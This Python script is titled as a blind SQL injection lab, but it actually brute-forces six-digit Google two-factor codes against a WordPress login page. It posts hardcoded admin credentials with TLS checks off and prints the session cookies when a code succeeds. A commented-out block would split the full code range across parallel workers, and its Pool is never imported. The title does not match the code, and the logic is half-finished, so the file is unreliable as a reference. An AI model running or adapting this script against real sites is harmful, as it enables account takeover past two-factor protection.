# Lab: Blind SQL injection with conditional responses
from requests import Session
import typer
from rich.console import Console

console = Console()
app = typer.Typer()
session = Session()


# log=admin&pwd=ubuntu&googleotp=391435&wp-submit=Log+In&redirect_to=https%3A%2F%2Flocalhost%2Fwordpress%2Fwp-admin%2F&testcookie=1


def login(server, code):
    headers = {'User-Agent': "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:105.0) Gecko/20100101 Firefox/105.0"}
    code = code
    response = session.post(f"{server}", headers=headers, data={
        "log": "admin",
        "pwd": "ubuntu",
        "googleotp": str(code).zfill(6),
        'rememberme': 'forever'
    }, allow_redirects=False, verify=False)

    if response.status_code == 302:
        result = {
            'token': code,
            'cookies': response.cookies.get_dict()
        }
        print(result)


def bruteforce(server, start, end):
    for code in range(start, end):
        print("code " + str(code))
        login(server, code)


@app.callback()
def main(
        server: str = typer.Option(
            ...,
            prompt=True,
            envvar="SERVER",
            help=f"Vulnerable server ID"
        )):
    # validate_server(server)
    code = input("code:")
    login("http://192.168.43.210/wordpress/wp-login.php",code)

'''
    pool = Pool()
    result1 = pool.apply_async(bruteforce, [server, 0, 333333])  # evaluate "solve1(A)" asynchronously
    result2 = pool.apply_async(bruteforce, [server, 333331, 666666])  # evaluate "solve2(B)" asynchronously
    result3 = pool.apply_async(bruteforce, [server, 666661, 999999])  # evaluate "solve2(B)" asynchronously
    answer1 = result1.get(timeout=None)
    answer2 = result2.get(timeout=None)
    answer3 = result3.get(timeout=None)
'''

def run():
    try:
        typer.run(main)
    except Exception as e:
        console.print(f"[red bold]Error:[/red bold] {e}")


if __name__ == "__main__":
    run()
